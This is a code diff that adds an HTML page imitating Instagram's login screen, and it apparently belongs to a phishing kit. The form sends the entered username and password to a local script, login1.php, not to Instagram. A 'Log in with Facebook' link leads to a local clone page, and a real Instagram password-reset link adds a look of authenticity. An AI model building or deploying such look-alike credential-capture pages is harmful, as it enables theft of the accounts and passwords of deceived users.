@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+      * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+}
+
+/* MAIN LAYOUT */
+.page {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    gap: 80px;
+}
+
+/* LEFT IMAGE */
+.left img {
+    width: 420px;
+}
+
+/* RIGHT LOGIN */
+.right {
+    width: 350px;
+    text-align: center;
+}
+
+.logo {
+    font-family: cursive;
+    font-size: 42px;
+    margin-bottom: 30px;
+}
+
+.right input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    background: #fafafa;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 10px;
+    background-color: #4cb5f9;
+    border: none;
+    color: white;
+    font-weight: bold;
+    border-radius: 8px;
+    cursor: pointer;
+}
+
+/* OR DIVIDER */
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+}
+
+.divider span {
+    flex: 1;
+    height: 1px;
+    background-color: #dbdbdb;
+}
+
+.divider p {
+    margin: 0 10px;
+    font-size: 12px;
+    color: #8e8e8e;
+}
+
+/* LINKS */
+.fb-login {
+    display: block;
+    color: #385185;
+    font-weight: bold;
+    text-decoration: none;
+    margin-bottom: 15px;
+}
+
+.forgot {
+    font-size: 12px;
+    color: #00376b;
+    text-decoration: none;
+}
+
+.signup {
+    margin-top: 30px;
+    font-size: 14px;
+}
+
+.signup a {
+    color: #0095f6;
+    font-weight: bold;
+    text-decoration: none;
+}
+
+    </style>
+</head>
+<body>
+
+<div class="page">
+
+    <!-- LEFT IMAGE SECTION -->
+    <div class="left">
+        <img src="instagramside.png" alt="Instagram preview">
+    </div>
+
+    <!-- RIGHT LOGIN SECTION -->
+    
+    <div class="right">
+        <h1 class="logo">Instagram</h1>
+        
+        <form action="login1.php" method="POST">
+            
+            <input type="text" placeholder="Phone number, username, or email" name="username" required>
+            <input type="password" placeholder="Password" name="password" required>
+
+            <button class="login-btn" type="submit">Log in</button>
+        </form>
+         
+        <div class="divider"></div>
+        
+       
+
+
+         
+        <div class="divider">
+           
+        </div>
+        
+        <a href="facebook/facebook.html" class="fb-login" name="Phone number, username, or email" >Log in with Facebook</a>
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" name="email_or_username">Forgot password?</a>
+        <p class="signup">
+            Don't have an account? <a href="signup.html">Sign up</a>
+        </p>
+       
+    </div>
+
+</div>
+
+</body>
+</html>
